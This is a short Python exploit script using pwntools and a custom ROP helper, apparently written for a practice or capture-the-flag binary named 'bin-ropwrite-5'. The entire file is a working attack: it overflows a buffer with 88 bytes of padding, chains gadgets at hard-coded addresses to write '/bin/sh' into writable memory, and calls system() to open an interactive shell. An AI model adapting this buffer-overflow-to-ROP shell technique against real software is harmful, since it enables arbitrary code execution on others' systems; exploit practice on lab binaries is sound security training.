import Fart_ROP
from pwn import *
from analyze import *

binary = './bins2/bin-ropwrite-5'
context.terminal = ["tmux", "splitw", "-h"]

anal = Analyze(binary)
rop = Fart_ROP.ROP(anal)

writeable_mem = anal.elf.sym['__data_start']

gs = '''
continue
'''


def start():
    if args.GDB:
        return gdb.debug(anal.elf.path, gdbscript=gs)
    else:
        return process(anal.elf.path)



chain = b''
chain += b'A' * 88

chain += rop.fill_reg('r8', writeable_mem)

chain += rop.fill_reg('rax', '/bin/sh\0')

chain += p64(0x0000000000400779) # mov qword ptr [r8], rax; pop r15; ret;
chain += p64(0) # r15


chain += p64(0x0000000000400764) # pop rdi; ret;
chain += p64(writeable_mem) # rdi

chain += p64(anal.elf.sym['_fini'])


chain += p64(anal.elf.sym['system'])

io = start()
io.sendline(chain)
io.interactive()
